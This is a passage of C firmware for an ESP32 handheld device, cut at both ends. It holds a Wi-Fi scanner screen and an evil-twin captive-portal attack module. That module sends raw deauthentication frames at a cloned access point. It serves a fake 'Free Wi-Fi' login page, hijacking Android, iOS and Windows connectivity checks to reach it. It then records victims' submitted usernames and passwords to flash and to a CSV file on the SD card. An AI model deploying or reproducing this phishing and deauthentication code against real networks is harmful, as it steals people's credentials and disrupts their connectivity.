    if (feature_active && readTouchXY(&(x), &(y))) {
      const uint32_t nowMs = sys_monotonic_ms();
      if (nowMs - lastTouchActionMs < 250) {
        lastTouchCheck = sys_monotonic_ms();
        return;
      }
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > WifiScan_iconX[i] && x < WifiScan_iconX[i] + ICON_SIZE) {
            if (WifiScan_icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
                lastTouchActionMs = nowMs;
              } else {
                display_draw_bitmap(&(tft), WifiScan_iconX[i], iconY,
                                    WifiScan_icons[i], ICON_SIZE, ICON_SIZE,
                                    TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
                lastTouchActionMs = nowMs;
              }
            }
            break;
          }
        }
      } else if (!WifiScan_isScanning) {
        const int networkCount = network_scan_result_count();

        // Deauther-like bottom bar has a large touch hitbox.
        if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
          const bool prevDisabled = (WifiScan_current_page == 0);
          const bool nextDisabled =
              ((WifiScan_current_page + 1) * WifiScan_wifiNetworksPerPage() >=
               networkCount);

          if (x >= 0 && x <= 57) {
            WifiScan_drawButton(0, 304, 57, 16, "Rescan", true, false);
            sys_sleep_ms(50);
            WifiScan_startWiFiScan();
            lastTouchActionMs = nowMs;
          } else if (x >= 117 && x <= 179 && !WifiScan_isDetailView &&
                     !prevDisabled) {
            WifiScan_drawButton(117, 304, 57, 16, "Prev", true, false);
            WifiScan_current_page--;
            if (WifiScan_current_page < 0) WifiScan_current_page = 0;
            sys_sleep_ms(50);
            WifiScan_displayWiFiList(true);
            lastTouchActionMs = nowMs;
          } else if (x >= 177 && x <= 240) {
            if (WifiScan_isDetailView) {
              WifiScan_drawButton(177, 304, 57, 16, "Back", true, false);
              WifiScan_isDetailView = false;
              sys_sleep_ms(50);
              WifiScan_displayWiFiList(true);
              lastTouchActionMs = nowMs;
            } else if (!nextDisabled) {
              WifiScan_drawButton(177, 304, 57, 16, "Next", true, false);
              WifiScan_current_page++;
              sys_sleep_ms(50);
              WifiScan_displayWiFiList(true);
              lastTouchActionMs = nowMs;
            }
          }
        } else if (!WifiScan_isDetailView) {
          const int listMaxY =
              WifiScan_LIST_FIRST_ROW_Y +
              (WifiScan_wifiNetworksPerPage() * WifiScan_LIST_ROW_H);
          if (networkCount > 0 && y >= WifiScan_LIST_FIRST_ROW_Y &&
              y < listMaxY) {
            const int row =
                (y - WifiScan_LIST_FIRST_ROW_Y) / WifiScan_LIST_ROW_H;
            const int idx =
                (WifiScan_current_page * WifiScan_wifiNetworksPerPage()) + row;
            if (idx >= 0 && idx < networkCount) {
              WifiScan_currentIndex = idx;
              WifiScan_isDetailView = true;
              WifiScan_displayWiFiDetails();
              lastTouchActionMs = nowMs;
            }
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void WifiScan_wifiscanSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  WifiScan_wifiScanUpdateNavLabels();
  featureClearContent(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  WifiScan_uiDrawn = false;
  WifiScan_runUI();

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
#endif

  setupTouchscreen();

  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(false, false);

  if (WifiScan_bgScanRunning) {
    WifiScan_stopBgWifiScanIfRunning();
  }

  int existing = network_scan_result_count();

  // shows stale/partial lists.
  if ((*settings()).autoWifiScan && existing >= 0 && WifiScan_bgHasResults) {
    WifiScan_current_page = 0;
    WifiScan_currentIndex = 0;
    WifiScan_listStartIndex = 0;
    WifiScan_isDetailView = false;
    WifiScan_displayWiFiList(true);
  } else {
    WifiScan_startWiFiScan();
  }

  redrawTouchButtonBar();
}

void WifiScan_wifiscanLoop(void) {
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  static bool lastDetailView = false;
  static bool lastScanning = true;

  WifiScan_handleButton();
  WifiScan_runUI();
  updateStatusBar();

  if (WifiScan_isScanning) {
    if (!lastScanning) {
      WifiScan_displayScanning();
      lastScanning = true;
    }
  } else if (!WifiScan_isDetailView) {
    if (lastDetailView || lastScanning) {
      WifiScan_displayWiFiList(true);
    }
    lastDetailView = false;
    lastScanning = false;
  } else {
    if (!lastDetailView) {
      WifiScan_displayWiFiDetails();
    }
    lastDetailView = true;
  }
}

#define CP_LINE_HEIGHT 12
#undef MAX_LINES
#define MAX_LINES 23

static unsigned long CaptivePortal_cportalLastBtnMs = 0;
static const unsigned long CaptivePortal_cportalDebounceMs = 200;
enum { CaptivePortal_kCredRowsPerPage = 18 };

static bool CaptivePortal_s_cloneUiActive = false;
static bool CaptivePortal_s_clonePrevEn = false;
static bool CaptivePortal_s_cloneNextEn = false;
static bool CaptivePortal_s_clonePickMode = false;
static int CaptivePortal_s_cloneLastRenderedPage = -1;
static int CaptivePortal_s_cloneLastRenderedSel = -1;
static bool CaptivePortal_s_cloneLastPrevEn = false;
static bool CaptivePortal_s_cloneLastNextEn = false;

enum { CaptivePortal_CP_CLONE_ROW_H = 22 };
enum { CaptivePortal_CP_CLONE_HINT_H = 12 };
enum { CaptivePortal_CP_CLONE_HEADER_BLOCK_H = 28 };

static int CaptivePortal_cpCloneListAreaTop(void) { return kWifiBodyTop + 4; }

static int CaptivePortal_cpCloneListAreaBottom(void) {
  return wifiListBottomY() - CaptivePortal_CP_CLONE_HINT_H;
}

static int CaptivePortal_cpCloneRowsPerPage(void) {
  const int listH = CaptivePortal_cpCloneListAreaBottom() -
                    CaptivePortal_cpCloneListAreaTop() -
                    CaptivePortal_CP_CLONE_HEADER_BLOCK_H;
  return DIV_MAX(1, listH / CaptivePortal_CP_CLONE_ROW_H);
}

static int CaptivePortal_cpCloneHeaderY(void) {
  const int rowsPerPage = CaptivePortal_cpCloneRowsPerPage();
  const int listH = rowsPerPage * CaptivePortal_CP_CLONE_ROW_H;
  const int total = CaptivePortal_CP_CLONE_HEADER_BLOCK_H + listH +
                    CaptivePortal_CP_CLONE_HINT_H;
  const int avail = CaptivePortal_cpCloneListAreaBottom() -
                    CaptivePortal_cpCloneListAreaTop();
  return CaptivePortal_cpCloneListAreaTop() + DIV_MAX(0, (avail - total) / 2);
}

static int CaptivePortal_cpCloneFirstRowY(void) {
  return CaptivePortal_cpCloneHeaderY() + CaptivePortal_CP_CLONE_HEADER_BLOCK_H;
}

typedef enum CaptivePortal_CpCloneAction {
  CaptivePortal_CpCloneAction_Wait,
  CaptivePortal_CpCloneAction_Back,
  CaptivePortal_CpCloneAction_Rescan,
  CaptivePortal_CpCloneAction_Pick,
  CaptivePortal_CpCloneAction_Prev,
  CaptivePortal_CpCloneAction_Next,
  CaptivePortal_CpCloneAction_ListTap,
  CaptivePortal_CpCloneAction_Exit
} CaptivePortal_CpCloneAction;

static void CaptivePortal_cportalUpdateNavLabels(void);
static void CaptivePortal_cportalTeardown(void);
static void CaptivePortal_cportalHandleMainNavButtons(void);
static void CaptivePortal_cportalHandleCredNavButtons(void);
static void CaptivePortal_cpEditSsid(void);
static void CaptivePortal_cpStopDeauth(void);
static CaptivePortal_CpCloneAction CaptivePortal_cpCloneWaitInput(
    bool prevEnabled, bool nextEnabled, bool pickMode, int* tx, int* ty);
static void CaptivePortal_cpCloneEndUi(void);

const char* CaptivePortal_default_ssid = "ESP32DIV_AP";
char CaptivePortal_custom_ssid[32] = "ESP32DIV_AP";
const char* CaptivePortal_password = NULL;

static uint8_t CaptivePortal_ap_channel = 1;

static bool CaptivePortal_cp_deauth_active = false;
static wifi_ap_record_t CaptivePortal_cp_target_ap;
static uint8_t CaptivePortal_cp_target_channel;
static uint32_t CaptivePortal_cp_deauth_packet_count = 0;
static uint32_t CaptivePortal_cp_deauth_success_count = 0;
static unsigned long CaptivePortal_cp_last_deauth_time = 0;

static uint8_t CaptivePortal_cp_deauth_frame_default[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
static uint8_t CaptivePortal_cp_deauth_frame[sizeof(
    CaptivePortal_cp_deauth_frame_default)];
static httpd_handle_t CaptivePortal_cp_httpd = NULL;
static captive_dns_t CaptivePortal_cp_dns;

bool CaptivePortal_attackActive = false;

static void CaptivePortal_stopAttack(void);
static void CaptivePortal_startAttack(void);
void CaptivePortal_drawMainMenu(void);

#define MAX_CREDS 20

enum {
  CaptivePortal_terminalBuffer_COUNT = MAX_LINES,
  CaptivePortal_terminalBuffer_OFFSET = 0
};
_Static_assert(CaptivePortal_terminalBuffer_OFFSET +
                       CaptivePortal_terminalBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define CaptivePortal_terminalBuffer                  \
  (*(text_t(*)[CaptivePortal_terminalBuffer_COUNT]) & \
   feature_text_slots[CaptivePortal_terminalBuffer_OFFSET])
uint16_t CaptivePortal_colorBuffer[MAX_LINES];
int CaptivePortal_lineIndex = 0;

typedef struct CaptivePortal_Credential {
  char username[16];
  char password[16];
  char ssid[32];
} CaptivePortal_Credential;
#define CaptivePortal_Credential_INITIALIZER {0}
;

typedef enum CaptivePortal_Screen {
  CaptivePortal_MAIN_MENU,
  CaptivePortal_CRED_LIST
} CaptivePortal_Screen;
CaptivePortal_Screen CaptivePortal_currentScreen = CaptivePortal_MAIN_MENU;
int CaptivePortal_credPage = 0;

text_t CaptivePortal_inputSSID = {.data = ""};

const char* CaptivePortal_seriesSSIDs[] = {"ESP32DIV_AP", "FreeWiFi",
                                           "Loading..."};
enum { CaptivePortal_numSeriesSSIDs = 3 };
int CaptivePortal_seriesSSIDIndex = 0;

static const char CaptivePortal_loginPage[] =
    "\n"
    "<!DOCTYPE html>\n"
    "<html>\n"
    "<head>\n"
    "  <title>Wi-Fi Login</title>\n"
    "  <meta name='viewport' content='width=device-width, initial-scale=1'>\n"
    "  <meta http-equiv='Cache-Control' content='no-cache, no-store, "
    "must-revalidate'>\n"
    "  <meta http-equiv='Pragma' content='no-cache'>\n"
    "  <meta http-equiv='Expires' content='0'>\n"
    "  <style>\n"
    "    body { font-family: Arial, sans-serif; text-align: center; padding: "
    "20px; background-color: #f0f0f0; }\n"
    "    h1 { color: #333; }\n"
    "    .container { max-width: 400px; margin: auto; padding: 20px; "
    "background: white; border-radius: 10px; }\n"
    "    input { padding: 10px; margin: 10px 0; width: 100%; box-sizing: "
    "border-box; border: 1px solid #ccc; border-radius: 5px; }\n"
    "    button { padding: 10px; background-color: #007BFF; color: white; "
    "border: none; border-radius: 5px; cursor: pointer; width: 100%; }\n"
    "    button:hover { background-color: #0056b3; }\n"
    "  </style>\n"
    "</head>\n"
    "<body>\n"
    "  <div class='container'>\n"
    "    <h1>Free Wi-Fi</h1>\n"
    "    <p>Log in to connect.</p>\n"
    "    <form action='/login' method='POST'>\n"
    "      <input type='text' name='username' placeholder='Username' "
    "required><br>\n"
    "      <input type='password' name='password' placeholder='Password' "
    "required><br>\n"
    "      <button type='submit'>Log In</button>\n"
    "    </form>\n"
    "  </div>\n"
    "</body>\n"
    "</html>\n";

void CaptivePortal_scrollTerminal(void) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    CaptivePortal_terminalBuffer[i] = CaptivePortal_terminalBuffer[i + 1];
    CaptivePortal_colorBuffer[i] = CaptivePortal_colorBuffer[i + 1];
  }
}

void CaptivePortal_displayPrint(text_t text, uint16_t color, bool extraSpace) {
  if (CaptivePortal_lineIndex >= MAX_LINES - 1) {
    CaptivePortal_scrollTerminal();
    CaptivePortal_lineIndex = MAX_LINES - 1;
  }

  CaptivePortal_terminalBuffer[CaptivePortal_lineIndex] = text;
  CaptivePortal_colorBuffer[CaptivePortal_lineIndex] = color;
  CaptivePortal_lineIndex++;

  if (extraSpace && CaptivePortal_lineIndex < MAX_LINES) {
    CaptivePortal_terminalBuffer[CaptivePortal_lineIndex] = TEXT("");
    CaptivePortal_colorBuffer[CaptivePortal_lineIndex] = TFT_WHITE;
    CaptivePortal_lineIndex++;
  }

  const int bodyBottom = wifiContentBottom();
  for (int i = 0; i < CaptivePortal_lineIndex; i++) {
    int yPos = i * CP_LINE_HEIGHT + 45;
    if (yPos + CP_LINE_HEIGHT > bodyBottom) {
      break;
    }
    display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
    display_fill_rect(&(tft), 5, yPos, display_width(&(tft)) - 10,
                      CP_LINE_HEIGHT, TFT_BLACK);
    display_set_text_color_2(&(tft), CaptivePortal_colorBuffer[i], TFT_BLACK);
    display_set_cursor(&(tft), 5, yPos);
    display_print(&(tft), (CaptivePortal_terminalBuffer[i]).data);
  }
}

void CaptivePortal_saveCredential(text_t username,
                                  text_t CaptivePortal_password, text_t ssid) {
  CaptivePortal_Credential cred = CaptivePortal_Credential_INITIALIZER;
  strncpy(cred.username, (username).data, 15);
  cred.username[15] = '\0';
  strncpy(cred.password, (CaptivePortal_password).data, 15);
  cred.password[15] = '\0';
  strncpy(cred.ssid, (ssid).data, 31);
  cred.ssid[31] = '\0';

  int count = nv_count("portal");
  printf("Before saving, credential count: %d\n", count);
  if (count < MAX_CREDS) {
    __auto_type key = nv_key("cred", count);
    NV_PUT("portal", (key).data, cred);
    count++;
    NV_PUT("portal", "count", count);
    printf("Credential saved at key %s\n", (key).data);
    printf("Username: %s\n", cred.username);
    printf("Password: %s\n", cred.password);
    printf("SSID: %s\n", cred.ssid);
    printf("After saving, credential count: %d\n", count);
  } else {
    div_console_line(TEXT("Credential storage full"));
  }
}

static bool CaptivePortal_cp_sd_mounted = false;

static bool CaptivePortal_cpMountSD(void) {
  if (CaptivePortal_cp_sd_mounted) {
    if (storage_exists("/")) return true;
    CaptivePortal_cp_sd_mounted = false;
  }

  CaptivePortal_cp_sd_mounted = isSDCardAvailable();
  return CaptivePortal_cp_sd_mounted;
}

static bool CaptivePortal_cpEnsureDir(const char* dirPath) {
  if (!CaptivePortal_cpMountSD()) return false;
  if (!storage_exists(dirPath)) {
    if (storage_mkdir(dirPath)) return true;

    if (dirPath && dirPath[0] == '/') return storage_mkdir(dirPath + 1);
    return false;
  }
  return true;
}

static text_t CaptivePortal_cpCsvEscape(text_t s) {
  bool needsQuotes = false;
  for (size_t i = 0; i < strlen((s).data); i++) {
    char c = (s).data[i];
    if (c == ',' || c == '"' || c == '\n' || c == '\r') {
      needsQuotes = true;
      break;
    }
  }
  if (!needsQuotes) return s;

  text_t out = {.data = "\""};
  for (size_t i = 0; i < strlen((s).data); i++) {
    char c = (s).data[i];
    if (c == '"')
      text_append_cstr(&(out), "\"\"");
    else
      text_append_cstr(&(out), (TEXT(c)).data);
  }
  text_append_cstr(&(out), "\"");
  return out;
}

static bool CaptivePortal_cpAppendLineToFile(const char* path, text_t line) {
  if (!CaptivePortal_cpMountSD()) return false;

  storage_file_t f __attribute__((cleanup(storage_file_close))) =
      storage_file_open(path, "a");
  if (!storage_file_valid(&(f))) {
    CaptivePortal_cp_sd_mounted = false;
    if (!CaptivePortal_cpMountSD()) return false;
    storage_file_replace(&(f), storage_file_open(path, "a"));
    if (!storage_file_valid(&(f))) return false;
  }

  bool ok = (storage_file_print_cstr(&(f), (line).data) > 0);
  storage_file_flush(&(f));
  storage_file_close(&(f));
  return ok;
}

static bool portal_csv_field(storage_file_t* file, const char* value) {
  bool quoted = strpbrk(value, ",\"\r\n") != NULL;
  if (quoted && storage_file_write(file, "\"", 1) != 1) return false;
  for (const char* p = value; *p; ++p) {
    if (*p == '"' && storage_file_write(file, "\"", 1) != 1) return false;
    if (storage_file_write(file, p, 1) != 1) return false;
  }
  return !quoted || storage_file_write(file, "\"", 1) == 1;
}
static bool CaptivePortal_cpAppendCaptureToSD(text_t remoteIp, text_t username,
                                              text_t passwordStr, text_t ssid) {
  if (!CaptivePortal_cpEnsureDir("/captive_portal")) return false;
  storage_file_t file __attribute__((cleanup(storage_file_close))) =
      storage_file_open("/captive_portal/captured.csv", "a");
  if (!storage_file_valid(&file)) return false;
  if (!storage_file_size(&file) &&
      !storage_file_printf(&file,
                           "millis,remote_ip,ssid,username,password\r\n"))
    return false;
  bool ok =
      storage_file_printf(&file, "%lu,", (unsigned long)sys_monotonic_ms()) > 0;
  const char* fields[] = {remoteIp.data, ssid.data, username.data,
                          passwordStr.data};
  for (size_t i = 0; i < 4 && ok; ++i) {
    ok = portal_csv_field(&file, fields[i]);
    if (i < 3) ok = ok && storage_file_write(&file, ",", 1) == 1;
  }
  return ok && storage_file_write(&file, "\r\n", 2) == 2;
}

static bool CaptivePortal_cpDumpAllCredentialsToSD(int* outCount) {
  if (outCount) *outCount = 0;
  const char* dir = "/captive_portal";
  const char* path = "/captive_portal/eeprom_dump.csv";
  if (!CaptivePortal_cpEnsureDir(dir)) return false;

  int count = nv_count("portal");
  if (count < 0) count = 0;
  if (count > MAX_CREDS) count = MAX_CREDS;

  storage_file_t f __attribute__((cleanup(storage_file_close))) =
      storage_file_open(path, "w");
  if (!storage_file_valid(&(f))) {
    CaptivePortal_cp_sd_mounted = false;
    if (!CaptivePortal_cpMountSD()) return false;
    storage_file_replace(&(f), storage_file_open(path, "w"));
    if (!storage_file_valid(&(f))) return false;
  }

  storage_file_print_cstr(&(f), "index,ssid,username,password\r\n");
  for (int i = 0; i < count; i++) {
    CaptivePortal_Credential cred = CaptivePortal_Credential_INITIALIZER;
    NV_GET("portal", (nv_key("cred", i)).data, cred);
    if (!storage_file_printf(&f, "%d,", i) ||
        !portal_csv_field(&f, cred.ssid) ||
        storage_file_write(&f, ",", 1) != 1 ||
        !portal_csv_field(&f, cred.username) ||
        storage_file_write(&f, ",", 1) != 1 ||
        !portal_csv_field(&f, cred.password) ||
        storage_file_write(&f, "\r\n", 2) != 2)
      return false;
  }
  storage_file_flush(&(f));
  storage_file_close(&(f));
  if (outCount) *outCount = count;
  return true;
}

static void CaptivePortal_cpCredListStatus(text_t msg, uint16_t color) {
  const int y = DIV_MAX(50, wifiContentBottom() - 16);
  display_fill_rect(&(tft), 0, y, 240, 16, TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_text_size(&(tft), 1);
  display_set_cursor(&(tft), 2, y + 4);
  display_print(&(tft), (msg).data);
}

static void CaptivePortal_cpStartDeauth(text_t ssid, const uint8_t* bssid,
                                        uint8_t channel) {
  if (CaptivePortal_cp_deauth_active) return;

  memset(&CaptivePortal_cp_target_ap, 0, sizeof(CaptivePortal_cp_target_ap));
  strcpy((char*)CaptivePortal_cp_target_ap.ssid, (ssid).data);
  memcpy(CaptivePortal_cp_target_ap.bssid, bssid, 6);
  CaptivePortal_cp_target_ap.primary = channel;
  CaptivePortal_cp_target_channel = channel;

  CaptivePortal_cp_deauth_active = true;
  CaptivePortal_cp_deauth_packet_count = 0;
  CaptivePortal_cp_deauth_success_count = 0;
  CaptivePortal_cp_last_deauth_time = 0;

  printf("[CP Deauth] Starting deauth against cloned AP: %s CH=%u\n",
         (ssid).data, channel);
}

static void CaptivePortal_cpStopDeauth(void) {
  if (!CaptivePortal_cp_deauth_active) return;

  CaptivePortal_cp_deauth_active = false;
  printf("[CP Deauth] Stopped deauth (packets: %u, success: %u)\n",
         (unsigned)CaptivePortal_cp_deauth_packet_count,
         (unsigned)CaptivePortal_cp_deauth_success_count);
}

static void CaptivePortal_cpSendDeauthFrame(void) {
  if (!CaptivePortal_cp_deauth_active) return;

  esp_wifi_set_channel(CaptivePortal_cp_target_channel, WIFI_SECOND_CHAN_NONE);

  memcpy(CaptivePortal_cp_deauth_frame, CaptivePortal_cp_deauth_frame_default,
         26);
  memcpy(&CaptivePortal_cp_deauth_frame[10], CaptivePortal_cp_target_ap.bssid,
         6);
  memcpy(&CaptivePortal_cp_deauth_frame[16], CaptivePortal_cp_target_ap.bssid,
         6);
  CaptivePortal_cp_deauth_frame[24] = 7;
  CaptivePortal_cp_deauth_frame[25] = 0;
  if (Deauther_sendRawFrame(CaptivePortal_cp_deauth_frame, 26) == ESP_OK)
    ++CaptivePortal_cp_deauth_success_count;

  memcpy(CaptivePortal_cp_deauth_frame, CaptivePortal_cp_deauth_frame_default,
         26);
  memcpy(&CaptivePortal_cp_deauth_frame[10], CaptivePortal_cp_target_ap.bssid,
         6);
  memcpy(&CaptivePortal_cp_deauth_frame[16], CaptivePortal_cp_target_ap.bssid,
         6);

  memset(&CaptivePortal_cp_deauth_frame[4], 0xFF, 6);
  CaptivePortal_cp_deauth_frame[24] = 7;
  CaptivePortal_cp_deauth_frame[25] = 0;
  if (Deauther_sendRawFrame(CaptivePortal_cp_deauth_frame, 26) == ESP_OK)
    ++CaptivePortal_cp_deauth_success_count;

  CaptivePortal_cp_deauth_packet_count += 2;
}

static void CaptivePortal_cpHttpSend(httpd_req_t* req, int status,
                                     const char* contentType,
                                     const char* body) {
  if (status == 200) {
    httpd_resp_set_status(req, "200 OK");
  } else if (status == 302) {
    httpd_resp_set_status(req, "302 Found");
  } else {
    httpd_resp_set_status(req, "500 Internal Server Error");
  }
  httpd_resp_set_type(req, contentType);
  if (status == 302) {
    httpd_resp_set_hdr(req, "Location", "/login.html");
  }
  httpd_resp_send(req, body, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t CaptivePortal_cpHandleGenerate204(httpd_req_t* req) {
  div_console_line(TEXT("Android /generate_204 requested"));
  CaptivePortal_displayPrint(TEXT("Android /generate_204 requested"), GREEN,
                             false);
  CaptivePortal_cpHttpSend(req, 302, "text/plain", "");
  return ESP_OK;
}

static esp_err_t CaptivePortal_cpHandleHotspotDetect(httpd_req_t* req) {
  div_console_line(TEXT("iOS /hotspot-detect.html requested"));
  CaptivePortal_displayPrint(TEXT("iOS /hotspot-detect.html requested"), GREEN,
                             false);
  CaptivePortal_cpHttpSend(req, 200, "text/html", CaptivePortal_loginPage);
  return ESP_OK;
}

static esp_err_t CaptivePortal_cpHandleCaptiveApple(httpd_req_t* req) {
  div_console_line(TEXT("iOS /captive.apple.com requested"));
  CaptivePortal_displayPrint(TEXT("iOS /captive.apple.com requested"), GREEN,
                             false);
  CaptivePortal_cpHttpSend(
      req, 200, "text/html",
      "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
  return ESP_OK;
}

static esp_err_t CaptivePortal_cpHandleNCSITxt(httpd_req_t* req) {
  div_console_line(TEXT("Windows /ncsi.txt requested"));
  CaptivePortal_displayPrint(TEXT("Windows /ncsi.txt requested"), GREEN, false);
  CaptivePortal_cpHttpSend(req, 200, "text/plain", "Microsoft NCSI");
  return ESP_OK;
}

static esp_err_t CaptivePortal_cpHandleConnectTestTxt(httpd_req_t* req) {
  div_console_line(TEXT("Windows /connecttest.txt requested"));
  CaptivePortal_displayPrint(TEXT("Windows /connecttest.txt requested"), GREEN,
                             false);
  CaptivePortal_cpHttpSend(req, 200, "text/plain", "Microsoft Connect Test");
  return ESP_OK;
}

static esp_err_t CaptivePortal_cpHandleLoginPage(httpd_req_t* req) {
  div_console_line(TEXT("Login page (/login.html) requested"));
  CaptivePortal_displayPrint(TEXT("Login page (/login.html) requested"), GREEN,
                             false);
  CaptivePortal_cpHttpSend(req, 200, "text/html", CaptivePortal_loginPage);
  return ESP_OK;
}

static esp_err_t CaptivePortal_cpHandleRoot(httpd_req_t* req) {
  div_console_line(TEXT("Root (/) requested"));
  CaptivePortal_displayPrint(TEXT("Root (/) requested"), GREEN, false);
  CaptivePortal_cpHttpSend(req, 200, "text/html", CaptivePortal_loginPage);
  return ESP_OK;
}

static bool CaptivePortal_cpReadBody(httpd_req_t* req, char** out) {
  *out = NULL;
  size_t length = req->content_len;
  if (length > 4096) return false;
  char* body = calloc(length + 1, 1);
  if (!body) return false;
  size_t received = 0;
  while (received < length) {
    int n = httpd_req_recv(req, body + received, length - received);
    if (n <= 0) {
      free(body);
      return false;
    }
    received += n;
  }
  *out = body;
  return true;
}

static text_t CaptivePortal_cpFormValue(const char* body, const char* key) {
  text_t out = {0};
  if (!body || !key) return out;
  size_t keylen = strlen(key);
  const char* start = body;
  while (*start) {
    const char* end = strchr(start, '&');
    if (!end) end = start + strlen(start);
    if ((size_t)(end - start) > keylen && start[keylen] == '=' &&
        !strncmp(start, key, keylen)) {
      size_t used = 0;
      for (const char* p = start + keylen + 1;
           p < end && used + 1 < sizeof(out.data); ++p) {
        char c = *p;
        if (c == '+')
          c = ' ';
        else if (c == '%' && end - p >= 3) {
          char hex[] = {p[1], p[2], 0};
          c = (char)strtol(hex, NULL, 16);
          p += 2;
        }
        out.data[used++] = c;
      }
      out.data[used] = 0;
      return out;
    }
    start = *end ? end + 1 : end;
  }
  return out;
}

static esp_err_t CaptivePortal_cpHandleLoginPost(httpd_req_t* req) {
  char* body __attribute__((cleanup(c_free_pointer))) = NULL;
  if (!CaptivePortal_cpReadBody(req, &(body))) {
    CaptivePortal_cpHttpSend(req, 500, "text/plain", "read failed");
    return ESP_FAIL;
  }

  text_t username = CaptivePortal_cpFormValue(body, "username");
  text_t CaptivePortal_password = CaptivePortal_cpFormValue(body, "password");
  text_t remoteIp = {.data = ""};
  char ipBuf[16] = {0};
  if (req && req->user_ctx) {
    remoteIp = TEXT((const char*)req->user_ctx);
  } else {
    remoteIp = TEXT("0.0.0.0");
  }
  div_console_line(TEXT("Captured Credentials:"));
  printf("Username: %s\n", (username).data);
  printf("Password: %s\n", (CaptivePortal_password).data);
  printf("SSID: %s\n", CaptivePortal_custom_ssid);
  CaptivePortal_saveCredential(username, CaptivePortal_password,
                               TEXT(CaptivePortal_custom_ssid));
  if (CaptivePortal_cpAppendCaptureToSD(remoteIp, username,
                                        CaptivePortal_password,
                                        TEXT(CaptivePortal_custom_ssid))) {
    div_console_line(
        TEXT("[SD] Captive capture appended to /captive_portal/captured.csv"));
  } else {
    div_console_line(TEXT(
        "[SD] Captive capture export failed (SD not mounted / write error)"));
  }
  CaptivePortal_cpHttpSend(
      req, 200, "text/html",
      "<h1>Login Successful!</h1><p>You are now connected.</p>");
  return ESP_OK;
}

static esp_err_t CaptivePortal_cpHandleNotFound(httpd_req_t* req) {
  printf("Not found: %s\n", req->uri);
  CaptivePortal_cpHttpSend(req, 302, "text/plain", "");
  return ESP_OK;
}

static void CaptivePortal_cpRegisterUri(httpd_handle_t server, const char* uri,
                                        httpd_method_t method,
                                        esp_err_t (*handler)(httpd_req_t*)) {
  httpd_uri_t config = {0};
  config.uri = uri;
  config.method = method;
  config.handler = handler;
  config.user_ctx = NULL;
  httpd_register_uri_handler(server, &config);
}

static bool CaptivePortal_setupWebServer(void) {
  captive_dns_start(&(CaptivePortal_cp_dns), ((uint32_t)(network_ipv4(true))));
  if (CaptivePortal_cp_httpd) return true;

  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
  config.stack_size = 12288;
  config.uri_match_fn = httpd_uri_match_wildcard;

  if (httpd_start(&CaptivePortal_cp_httpd, &config) != ESP_OK) {
    CaptivePortal_cp_httpd = NULL;
    return false;
  }

  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/generate_204", HTTP_GET,
                              CaptivePortal_cpHandleGenerate204);
  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/hotspot-detect.html",
                              HTTP_GET, CaptivePortal_cpHandleHotspotDetect);
  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/captive.apple.com",
                              HTTP_GET, CaptivePortal_cpHandleCaptiveApple);
  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/ncsi.txt", HTTP_GET,
                              CaptivePortal_cpHandleNCSITxt);
  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/connecttest.txt",
                              HTTP_GET, CaptivePortal_cpHandleConnectTestTxt);
  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/login.html", HTTP_GET,
                              CaptivePortal_cpHandleLoginPage);
  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/", HTTP_GET,
                              CaptivePortal_cpHandleRoot);
  CaptivePortal_cpRegisterUri(CaptivePortal_cp_httpd, "/login", HTTP_POST,
                              CaptivePortal_cpHandleLoginPost);
  return true;
}

static void CaptivePortal_stopWebServer(void) {
  captive_dns_stop(&(CaptivePortal_cp_dns));
  if (CaptivePortal_cp_httpd) {
    httpd_stop(CaptivePortal_cp_httpd);
    CaptivePortal_cp_httpd = NULL;
  }
}

void CaptivePortal_loadSSID(void) {
  char saved[32] = {0};
  if (nv_read("portal", "ssid", saved, sizeof(saved)) == ESP_OK && saved[0]) {
    saved[31] = 0;
    div_copy_string(CaptivePortal_custom_ssid,
                    sizeof(CaptivePortal_custom_ssid), saved);
  } else
    div_copy_string(CaptivePortal_custom_ssid,
                    sizeof(CaptivePortal_custom_ssid),
                    CaptivePortal_default_ssid);
}
void CaptivePortal_saveSSID(text_t ssid) {
  text_copy(ssid, CaptivePortal_custom_ssid, sizeof(CaptivePortal_custom_ssid));
